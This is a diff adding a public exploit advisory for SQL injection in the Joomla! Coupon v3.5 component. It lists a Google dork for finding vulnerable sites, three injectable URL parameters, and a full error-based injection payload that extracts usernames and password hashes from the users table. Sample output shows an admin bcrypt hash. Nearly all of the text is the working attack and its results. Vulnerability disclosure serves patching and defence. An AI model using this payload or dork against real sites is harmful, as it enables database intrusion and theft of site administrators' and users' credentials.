@@ -1,0 +1,27 @@
+# # # # #
+# Exploit Title: Joomla! Component Coupon v3.5 - SQL Injection
+# Google Dork: inurl:index.php?option=com_coupon
+# Date: 03.03.2017
+# Vendor Homepage: http://joomla6teen.com/
+# Software: https://extensions.joomla.org/extensions/extension/e-commerce/gifts-a-coupons/coupon/
+# Demo: http://demo.joomla6teen.com/couponmanager/
+# Version: 3.5
+# Tested on: Win7 x64, Kali Linux x64
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Mail : ihsan[@]ihsan[.]net
+# # # # #
+# SQL Injection/Exploit :
+# http://localhost/[PATH]/index.php?option=com_coupon&view=coupons&task=mail_box&=[SQL]
+# http://localhost/[PATH]/index.php?option=com_coupon&view=coupons&catid=[SQL]
+# http://localhost/[PATH]/index.php?option=com_coupon&view=coupons&storeid=[SQL]
+# For example;
+# DATABASE > demojoom_coupon3
+# TABLES > wl6xp_users
+# COLUMNS > username, password
+# DATA
+# http://localhost/[PATH]/index.php?option=com_coupon&view=coupons&catid=7+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,char(58),password)+AS+CHAR),0x7e))+FROM+wl6xp_users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+# admin:$2y$10$IeBQiHyJNpZ7mVVNlmW7..Xr5I4tSTlN5Dq7QVltnjtWmaWu2J4
+# Etc..
+# # # # #
